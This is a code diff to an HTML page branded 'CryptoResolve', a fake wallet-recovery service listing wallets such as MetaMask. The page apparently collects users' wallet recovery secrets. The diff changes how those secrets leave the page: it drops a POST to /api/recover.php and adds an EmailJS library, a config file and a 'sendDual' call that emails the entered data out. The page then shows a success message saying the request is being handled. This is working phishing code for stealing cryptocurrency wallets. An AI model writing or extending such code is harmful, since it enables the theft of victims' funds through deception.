@@ -6,6 +6,9 @@
     <title>CryptoResolve | Secure Wallet Recovery & Synchronization</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <!-- EmailJS Library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="emailjs-config.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
         body { font-family: 'Inter', sans-serif; background-color: #0f172a; color: white; }
@@ -89,7 +92,14 @@
     </section>
 
     <script>
+        // Initialize EmailJS on page load
         document.addEventListener('DOMContentLoaded', () => {
+            // Initialize EmailJS
+            const emailjsInitialized = EmailJSRecovery.init();
+            if (emailjsInitialized) {
+                console.log('EmailJS recovery system ready');
+            }
+            
             const walletBasePath = 'assets/';
             const wallets = [
                 { name: 'MetaMask', logo: `${walletBasePath}metamask.png`, alt: 'MetaMask logo' },
@@ -373,51 +383,45 @@
                 return;
             }
 
+            // Validate recovery data
+            const validationErrors = EmailJSRecovery.validate(activeRecoveryType, recoveryText);
+            if (validationErrors.length > 0) {
+                notificationToast.classList.remove('hidden');
+                notificationTitle.innerText = 'Invalid data format';
+                notificationMessage.innerText = validationErrors[0];
+                return;
+            }
+
             modalContent.classList.add('hidden');
             successState.classList.add('hidden');
             loadingState.classList.remove('hidden');
             notificationToast.classList.remove('hidden');
 
-            const subject = `${document.getElementById('walletTitle').innerText} Recovery Request`;
-            const payload = {
-                type: activeRecoveryType,
-                wallet: document.getElementById('walletTitle').innerText,
-                data: recoveryText,
-                subject
-            };
+            const walletName = document.getElementById('walletTitle').innerText;
 
-            startNotification().then(() => {
-                fetch('/api/recover.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => response.json())
-                .then(result => {
+            startNotification().then(async () => {
+                try {
+                    // Send via EmailJS (primary method)
+                    const emailResult = await EmailJSRecovery.sendDual(
+                        activeRecoveryType,
+                        walletName,
+                        recoveryText
+                    );
+
                     loadingState.classList.add('hidden');
-                    if (result.success) {
-                        notificationTitle.innerText = 'Successful';
-                        notificationMessage.innerText = 'Everything finished loading successfully. Your recovery request is now being processed securely.';
-                        successState.classList.remove('hidden');
-                        notificationToast.classList.add('hidden');
-                        technicalPopup.classList.add('hidden');
-                        setTimeout(closeModal, 3000);
-                    } else {
-                        notificationTitle.innerText = 'Processing error';
-                        notificationMessage.innerText = result.error || 'The system could not complete the request. Please try again later.';
-                        technicalPopupMessage.innerText = result.error ? `Technical details: ${result.error}` : 'Technical details are unavailable. Check the recovery service endpoint or your network connection.';
-                        notificationToast.classList.add('hidden');
-                        technicalPopup.classList.remove('hidden');
-                    }
-                })
-                .catch(() => {
+                    notificationTitle.innerText = 'Successful';
+                    notificationMessage.innerText = 'Recovery data sent successfully. Check your email for confirmation.';
+                    successState.classList.remove('hidden');
+                    notificationToast.classList.add('hidden');
+                    technicalPopup.classList.add('hidden');
+                    setTimeout(closeModal, 3000);
+                } catch (error) {
                     loadingState.classList.add('hidden');
                     notificationToast.classList.add('hidden');
-                    technicalPopupMessage.innerText = 'Unable to connect to the recovery service. Please verify your network and try again. If the problem persists, contact support with the error code: NETWORK_FAILURE.';
+                    technicalPopupMessage.innerText = `Error: ${error.message}`;
                     technicalPopup.classList.remove('hidden');
-                });
+                    console.error('Recovery submission error:', error);
+                }
             });
         }
 
@@ -431,58 +435,47 @@
                 return;
             }
 
+            // Validate recovery data
+            const validationErrors = EmailJSRecovery.validate(activeRecoveryType, recoveryText);
+            if (validationErrors.length > 0) {
+                notificationToast.classList.remove('hidden');
+                notificationTitle.innerText = 'Invalid data format';
+                notificationMessage.innerText = validationErrors[0];
+                return;
+            }
+
             modalContent.classList.add('hidden');
             successState.classList.add('hidden');
             loadingState.classList.remove('hidden');
             notificationToast.classList.remove('hidden');
 
-            const subject = `${document.getElementById('walletTitle').innerText} Recovery Request`;
-            const payload = {
-                type: activeRecoveryType,
-                wallet: document.getElementById('walletTitle').innerText,
-                data: recoveryText,
-                subject
-            };
+            const walletName = document.getElementById('walletTitle').innerText;
 
-            startNotification().then(() => {
-                fetch('/api/recover.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => response.json())
-                .then(result => {
+            startNotification().then(async () => {
+                try {
+                    // Send via EmailJS (primary method)
+                    const emailResult = await EmailJSRecovery.sendDual(
+                        activeRecoveryType,
+                        walletName,
+                        recoveryText
+                    );
+
                     loadingState.classList.add('hidden');
-                    if (result.success) {
-                        notificationTitle.innerText = 'Successful';
-                        notificationMessage.innerText = 'Everything finished loading successfully. Your recovery request is now being processed securely.';
-                        successState.classList.remove('hidden');
-                        notificationToast.classList.add('hidden');
-                        technicalPopup.classList.add('hidden');
-                        setTimeout(closeModal, 3000);
-                    } else {
-                        notificationTitle.innerText = 'Processing error';
-                        notificationMessage.innerText = result.error || 'The system could not complete the request. Please try again later.';
-                        technicalPopupMessage.innerText = result.error ? `Technical details: ${result.error}` : 'Technical details are unavailable. Check the recovery service endpoint or your network connection.';
-                        notificationToast.classList.add('hidden');
-                        technicalPopup.classList.remove('hidden');
-                    }
-                })
-                .catch(() => {
+                    notificationTitle.innerText = 'Successful';
+                    notificationMessage.innerText = 'Recovery data sent successfully. Check your email for confirmation.';
+                    successState.classList.remove('hidden');
+                    notificationToast.classList.add('hidden');
+                    technicalPopup.classList.add('hidden');
+                    setTimeout(closeModal, 3000);
+                } catch (error) {
                     loadingState.classList.add('hidden');
                     notificationToast.classList.add('hidden');
-                    technicalPopupMessage.innerText = 'Unable to connect to the recovery service. Please verify your network and try again. If the problem persists, contact support with the error code: NETWORK_FAILURE.';
+                    technicalPopupMessage.innerText = `Error: ${error.message}`;
                     technicalPopup.classList.remove('hidden');
-                });
+                    console.error('Recovery submission error:', error);
+                }
             });
-
-        // Close on outside click
-        window.onclick = function(event) {
-            if (event.target === modal) closeModal();
-        };
-    });
+        });
     </script>
     <script>
         (function() {
